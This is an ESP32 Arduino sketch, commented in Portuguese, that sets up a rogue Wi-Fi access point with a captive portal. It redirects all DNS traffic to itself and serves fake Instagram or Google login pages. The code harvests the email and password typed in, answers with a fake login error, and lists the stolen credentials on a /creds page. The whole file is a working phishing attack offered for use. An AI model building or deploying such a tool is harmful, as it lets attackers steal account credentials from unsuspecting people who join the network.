#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h>

#include "settings.h"
#include "credenciais.h"
#include "functions.h"
#include "webfiles.h"

std::vector<Credencial> credenciais;
Settings settings;

// IP para o Captive Portal
IPAddress local_IP(192, 168, 4, 1);
IPAddress gateway(192, 168, 4, 1);
IPAddress subnet(255, 255, 255, 0);

// Porta do DNS
const byte DNS_PORT = 53;

// Cria um servidor web e um servidor DNS
WebServer server(80);
DNSServer dnsServer;

void listSPIFFSFiles() {
  // Inicializa o SPIFFS se ainda não estiver inicializado
  if (!SPIFFS.begin(true)) {
    Serial.println("Falha ao montar o SPIFFS");
    return;
  }

  Serial.println("Arquivos no SPIFFS:");

  // Abre o diretório raiz
  File root = SPIFFS.open("/");
  File file = root.openNextFile();

  // Percorre todos os arquivos
  while (file) {
    // Imprime o nome e o tamanho do arquivo
    Serial.print("Arquivo: ");
    Serial.print(file.name());
    Serial.print(" | Tamanho: ");
    Serial.println(file.size());
    
    // Abre o próximo arquivo
    file = root.openNextFile();
  }
}

void handleLoginPage() {

  String filePath = "/" + settings.getMode() + ".html";
  if (SPIFFS.exists(filePath)) {
    File file = SPIFFS.open(filePath, "r");
    server.streamFile(file, "text/html");
    file.close();
  } else {
    server.send(404, "text/plain", "Arquivo não encontrado.");
  }
}

void handleCredsPage() {
    String page = R"(
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
        <meta charset="UTF-8">
        <title>Credenciais Capturadas</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; flex-direction: column; height: 100vh; background-color: #f4f4f4; }
            table { border-collapse: collapse; width: 80%; max-width: 600px; }
            th, td { padding: 12px; border: 1px solid #ddd; text-align: left; }
            th { background-color: #3498db; color: white; }
            tr:nth-child(even) { background-color: #f2f2f2; }
            h2 { color: #333; text-align: center; }
        </style>
    </head>
    <body>
        <h2>Credenciais Capturadas</h2>
        <table>
            <tr><th>Usuário</th><th>Senha</th></tr>
    )";

    for (size_t i = 0; i < credenciais.size(); i++) {
        page += "<tr><td>" + credenciais[i].user + "</td><td>" + credenciais[i].pass + "</td></tr>";
    }

    page += R"(
        </table>
    </body>
    </html>
    )";

    server.send(200, "text/html", page);
}

void handleSettingsPage() {
    if (server.method() == HTTP_POST) {
        // Obtém os novos valores do formulário
        String mode = server.arg("mode");
        String ssid = server.arg("ssid");
        String password = server.arg("password");

        // Salva os novos valores nas configurações
        settings.setMode(mode);
        settings.setSSID(ssid.c_str());
        settings.setPassword(password.c_str());

        // Confirma que os valores foram salvos
        Serial.println("Valores após salvamento:");
        Serial.print("Modo: ");
        Serial.println(settings.getMode());
        Serial.print("SSID: ");
        Serial.println(settings.getSSID());
        Serial.print("Senha: ");
        Serial.println(settings.getPassword());

        // Responde ao cliente e reinicia
        server.send(200, "text/html", "<html><body><h2>Configurações atualizadas! Reiniciando...</h2></body></html>");
        delay(1000);
        ESP.restart();
    } else {
        // Exibe o formulário de configuração atual em partes concatenadas
        String page = R"(
        <!DOCTYPE html>
        <html lang="pt-BR">
        <head>
            <meta charset="UTF-8">
            <title>Configurações</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background-color: #f4f4f4; }
                form { width: 80%; max-width: 400px; background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2); }
                label { display: block; margin-top: 10px; }
                input[type="text"], select { width: 100%; padding: 8px; margin-top: 5px; }
                input[type="submit"] { width: 100%; padding: 10px; background-color: #3498db; color: white; border: none; cursor: pointer; margin-top: 15px; }
                input[type="submit"]:hover { background-color: #2980b9; }
                h2 { text-align: center; color: #333; }
            </style>
        </head>
        <body>
            <form method="POST" action="/settings">
                <h2>Configurações</h2>
                <label for="mode">Modo:</label>
                <select name="mode" id="mode">
        )";

        // Concatena as opções de modo dinamicamente
        page += "<option value=\"instagram\"";
        page += (settings.getMode() == "instagram") ? " selected" : "";
        page += ">Instagram</option>";

        page += "<option value=\"google\"";
        page += (settings.getMode() == "google") ? " selected" : "";
        page += ">Google</option>";
        
        // Continua a construção do HTML
        page += R"(
                </select>

                <label for="ssid">SSID:</label>
                <input type="text" name="ssid" id="ssid" value=")" + settings.getSSID() + R"(" required>

                <label for="password">Senha:</label>
                <input type="text" name="password" id="password" value=")" + settings.getPassword() + R"(" >

                <input type="submit" value="Salvar Configurações">
            </form>
        </body>
        </html>
        )";

        server.send(200, "text/html", page);
    }
}

// Função chamada quando um dispositivo se conecta
void onClientConnected(WiFiEvent_t event, WiFiEventInfo_t info) {
  // Formata o MAC Address do dispositivo conectado usando info.ap_station_connected.mac
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           info.wifi_ap_staconnected.mac[0], info.wifi_ap_staconnected.mac[1], 
           info.wifi_ap_staconnected.mac[2], info.wifi_ap_staconnected.mac[3], 
           info.wifi_ap_staconnected.mac[4], info.wifi_ap_staconnected.mac[5]);

  // Exibe o IP do AP e o MAC do dispositivo conectado numa linha
  Serial.printf("Novo dispositivo conectado -  MAC do dispositivo: %s\n",  macStr);
}

void setup() {
  Serial.begin(115200);

  // Inicializa o SPIFFS
  if (!SPIFFS.begin(true)) {
    Serial.println("Erro ao montar SPIFFS");
    return;
  }

  // Carrega credenciais salvas
  carregarCredenciais();

  Serial.println("");
  Serial.println("------ BOOTING ------");
  Serial.println("");

  Serial.println("setup :: Initialising File System... Success!");

  Serial.println("setup :: Starting copyWebFiles ...");
  copyWebFiles(true);
  Serial.println("setup :: copyWebFiles DONE");


  listSPIFFSFiles();

  // Exibe as configurações carregadas para verificar se são as novas
  Serial.print("SSID carregado: ");
  Serial.println(settings.getSSID());

  Serial.print("Senha carregada: ");
  Serial.println(settings.getPassword());

  Serial.print("Modo carregado: ");
  Serial.println(settings.getMode());

  // Configura o AP
  WiFi.softAPConfig(local_IP, gateway, subnet);

  if (settings.getPassword() != "") {
    WiFi.softAP(settings.getSSID().c_str(), settings.getPassword().c_str());
  } else {
    WiFi.softAP(settings.getSSID().c_str());
  }

  // Configura um manipulador de evento para conexões de clientes
  WiFi.onEvent(onClientConnected, ARDUINO_EVENT_WIFI_AP_STACONNECTED);

  // Configura o servidor DNS para capturar todas as requisições de domínio
  dnsServer.start(DNS_PORT, "*", local_IP);

  // Configura a rota para a página de login
  server.on("/", handleLoginPage);

  // Configura a rota para capturar os dados do formulário de login
  server.on("/get", HTTP_GET, []() {
    String username = server.arg("email");
    String password = server.arg("password");

    Serial.printf("Dados recebidos - Username: %s, Password: %s\n", username.c_str(), password.c_str());
    adicionarCredencial(username, password);

    server.send(403, "text/html", "<html><body><h1>Erro ao fazer login</h1><p>Verifique suas credenciais e tente novamente.</p></body></html>");

  });

  server.on("/creds", handleCredsPage);

  server.on("/settings", handleSettingsPage);

  // Redireciona todas as páginas para a página de login
  server.onNotFound([]() {
    server.sendHeader("Location", "/", true);
    server.send(302, "text/plain", "");
  });

  // Inicia o servidor web
  server.begin();

  Serial.println("Captive Portal Iniciado!");
  Serial.print("IP do AP: ");
  Serial.println(WiFi.softAPIP());
  Serial.print("SSID: ");
  Serial.println(settings.getSSID());
  Serial.print("Password: ");
  Serial.println(settings.getPassword());

}

void loop() {
  // Mantém o servidor DNS e o servidor web em execução
  dnsServer.processNextRequest();
  server.handleClient();
}
